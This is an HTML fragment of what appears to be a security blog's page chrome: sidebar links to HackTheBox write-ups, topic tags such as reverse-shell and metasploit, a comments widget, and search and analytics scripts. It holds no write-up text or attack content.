icon-13"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/lack-of-resources-&-rate-limiting/">OWASP API Security Lack of Resources & Rate Limiting</a><li><a href="/cyberwarfare/">The invisible war</a><li><a href="/Postman-Writeup/">Postman Writeup</a><li><a href="/Traverxec-Writeup/">Traverxec Writeup</a><li><a href="/Resolute-Writeup/">Resolute Writeup</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/oscp-prep/">oscp-prep</a> <a class="post-tag" href="/tags/htb-linux-easy/">htb-linux-easy</a> <a class="post-tag" href="/tags/htb-windows-easy/">htb-windows-easy</a> <a class="post-tag" href="/tags/reverse-shell/">reverse-shell</a> <a class="post-tag" href="/tags/hashcat/">hashcat</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/c/">C++</a> <a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/programming/">Programming</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div class="post-navigation d-flex justify-content-between"> <a href="/htb-servmon/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox - ServMon</p></a> <a href="/htb-grandpa/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox - Grandpa</p></a></div><div id="vcomments"></div><script> new Valine({ el: '#vcomments', appId: 'FWkEX16hdTMRmYzFQeIqS4GH-MdYXbMMI', appKey: 'ihjgIDYfMOWOfiX7hkrQrGXR', placeholder:'Your Comments.', avatar: 'wavatar', lang: 'en', enableQQ: true }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <a href="https://twitter.com/0x3n0?ref_src=twsrc%5Etfw" class="twitter-follow-button" data-size="large" data-dnt="true" data-show-count="false">Follow @0x3n0</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script></div><script src="https://www.hackthebox.com/badge/381523"></script></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/oscp-prep/">oscp prep</a> <a class="post-tag" href="/tags/htb-linux-easy/">htb linux easy</a> <a class="post-tag" href="/tags/htb-windows-easy/">htb windows easy</a> <a class="post-tag" href="/tags/reverse-shell/">reverse shell</a> <a class="post-tag" href="/tags/hashcat/">hashcat</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/c/">C++</a> <a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/programming/">Programming</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
